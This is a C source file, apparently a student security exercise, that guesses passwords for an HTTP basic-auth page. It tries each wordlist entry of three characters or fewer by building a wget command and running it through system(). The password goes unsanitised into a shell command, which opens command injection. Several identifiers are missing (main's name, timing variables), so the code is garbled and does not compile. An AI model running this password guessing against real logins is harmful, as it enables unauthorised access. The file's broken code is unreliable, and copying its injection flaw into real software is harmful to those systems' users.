

#include<stdio.h>
#include<strings.h>
#include<stdlib.h>
#include<ctype.h>
#define MAX_SIZE 255



int genchkpwd(char *passwd, FILE *fp)
 {
   int i,l=0,success;
   char str1[MAX_SIZE],str2[MAX_SIZE],tempstr[MAX_SIZE];
   char finput;
   
   strcpy(str1,"wget --http-user= --http-passwd=");
   strcpy(str2," http://sec-crack.cs.rmit.edu./SEC/2/");
   strcpy(tempstr,"");

     while ((finput=fgetc(fp)) != EOF)
       {
         l=0;
	 for (i=0;i<MAX_SIZE;i++)
	  passwd[i]='\0';
	 for (i=0;i<MAX_SIZE;i++)
	  tempstr[i]='\0';


 
         while(finput!='\n')
         {
	 
	   passwd[l]=finput;
	   l++;
	   finput = fgetc(fp);
	 } 


         
         if(strlen(passwd)<=3)
	  {
            strcat(tempstr,str1);
            strcat(tempstr,passwd);
            strcat(tempstr,str2);
	    printf("SENDING REQUEST AS %s\n",tempstr);
	    success=system (tempstr);
	  
            if (success==0) 
               return 1;
            else
              strcpy(tempstr,""); 
              strcpy(passwd,"");
          }
       }
	 
      return 1;      

  }  

int  (int argc, char *argv[])
 {
     FILE *fp;
     char chararray[52],passwd[MAX_SIZE];
     int i,success;
     


     
     int , end;    
      = time();	 

   if (argc != 2)
    {
      puts("Wrong Arguments FORMAT: ./<filename> <dictionary file>");
      exit(0);
    }
   fp = fopen(argv[1], "r"); 

   if (fp == NULL)
    {
      puts("Cannot Open Source File");
      exit(0);
    }
     for (i=0;i<3;i++)
      {
          passwd[i]='\0';
      }  

      success=genchkpwd(passwd,fp);
      printf("\nPassword is %s\n",passwd); 
      getpid();
      end = time(); 
      printf("Time required = %lld msec\n",(end-)/());
     return (EXIT_SUCCESS);
  }
     
	   
	  	
